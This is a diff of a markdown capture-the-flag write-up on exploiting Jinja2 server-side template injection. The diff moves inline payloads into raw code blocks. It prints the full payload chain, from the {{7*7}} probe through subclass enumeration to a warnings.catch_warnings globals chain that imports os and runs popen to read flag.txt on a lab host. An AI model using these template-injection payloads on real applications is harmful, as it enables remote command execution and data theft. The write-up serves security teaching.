@@ -42,9 +42,19 @@ SSTI is considered a high-severity vulnerability because it can lead to complete
 
 ### Testing for SSTI
 
-For Jinja2 we have a simple payload that we could try and confirm the existence of SSTI. `{{7*7}}`
+For Jinja2 we have a simple payload that we could try and confirm the existence of SSTI. 
 
-`94.237.54.192:48939/{{7*7}}`
+{% raw %}
+
+```
+{{7*7}}
+```
+
+```
+94.237.54.192:48939/{{7*7}}
+```
+
+{% endraw %}
 
 Our input wasn't `49` right?
 
@@ -58,11 +68,20 @@ Time for us to get the `/flag.txt`.
 
 We will attempt to exploit Python's object introspection capabilities to access the Method Resolution Order (MRO) of the string class (basically revealing class information).
 
-`94.237.54.192:48939/{{ ''.__class__.__mro__ }}`
+{% raw %}
+
+```
+94.237.54.192:48939/{{ ''.__class__.__mro__ }}
+```
+
+{% endraw %}
+
 
 Returns:
 
-`'(<class 'str'>, <class 'object'>)'`
+```
+'(<class 'str'>, <class 'object'>)'
+```
 
 Since `object` was also revealed we could use it to reveal the sub-classes.
 
@@ -70,14 +89,25 @@ Since `object` was also revealed we could use it to reveal the sub-classes.
 
 We will now try to request all the sub-classes with:
 
-`94.237.54.192:48939/{{ ''.__class__.__mro__[1].__subclasses__() }}`
+{% raw %}
+
+```
+94.237.54.192:48939/{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+
+{% endraw %}
+
 
 This will reveal a huge list of classes that inherit from object. We will try to find a class that we could use for malicious purpose specifically file operations in our context.
 
 We are looking for either of the sub-class:
 
+{% raw %}
+
 - `<class 'subprocess.Popen'>`
 - `<class '_io.TextIOWrapper'>`
+
+{% endraw %}
 
 I wrote a simple script that could be used to find the index of that sub-class:
 
@@ -102,7 +132,14 @@ We found it at index:
 
 We can confirm if the index really is correct by:
 
-`http://94.237.54.192:48939/%7B%7B%20''.__class__.__mro__[1].__subclasses__()[414]%20%7D%7D`
+{% raw %}
+
+```
+http://94.237.54.192:48939/%7B%7B%20''.__class__.__mro__[1].__subclasses__()[414]%20%7D%7D
+```
+
+{% endraw %}
+
 
 Going down this route didn't work for me the way I intended. The other sub-classes weren't of much use either.
 
@@ -110,15 +147,32 @@ Going down this route didn't work for me the way I intended. The other sub-class
 
 What I tried afterwards was to look for a sub-class that had `import` in their `global namespace`. One such sub-class is `warnings.catch_warnings`. We confirm if `import` is available by:
 
-`94.237.54.192:48939/{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__}}`
+{% raw %}
+
+```
+94.237.54.192:48939/{{''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__}}
+```
+{% endraw %}
+
 
 Afterwards, we will check if we can access the `import` function:
 
-`http://94.237.54.192:48939/%7B%7B''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__import__']%7D%7D`
+{% raw %}
+
+```
+http://94.237.54.192:48939/%7B%7B''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__import__']%7D%7D
+```
+{% endraw %}
+
 
 Then, `import os` and access `popen` to read `flag.txt`:
 
-`http://94.237.54.192:48939/%7B%7B"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat%20flag.txt").read()%7D%7D`
+{% raw %}
+
+```
+http://94.237.54.192:48939/%7B%7B"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat%20flag.txt").read()%7D%7D
+```
+{% endraw %}
 
 ---
 
